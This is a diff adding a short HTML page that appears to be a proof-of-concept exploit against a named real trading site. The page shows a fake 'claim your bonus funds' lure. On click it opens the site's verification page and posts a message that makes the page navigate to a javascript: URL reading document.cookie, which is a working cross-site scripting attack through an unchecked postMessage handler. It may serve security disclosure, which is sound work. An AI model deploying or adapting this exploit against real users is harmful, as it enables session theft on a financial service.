@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Bonus Funds</title>
+</head>
+<body style="background:#111;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;cursor:pointer;">
+  <div>Click anywhere to claim your bonus funds</div>
+  <script>
+    const targetURL = "https://eu.iqoption.com/en/verification/experience";
+    const payload = {
+      name: "goto",
+      data: {
+        url: "javascript:alert(document.cookie)",
+        external: true,
+        exactUrl: true
+      }
+    };
+
+    function launchAttack() {
+      const win = window.open(targetURL, "_blank");
+      if (win) {
+        setTimeout(() => {
+          win.postMessage(payload, "*");
+        }, 3000);
+      } else {
+        alert("Popup was blocked");
+      }
+    }
+
+    document.body.addEventListener("click", launchAttack);
+    document.body.addEventListener("keydown", launchAttack);
+  </script>
+</body>
+</html>
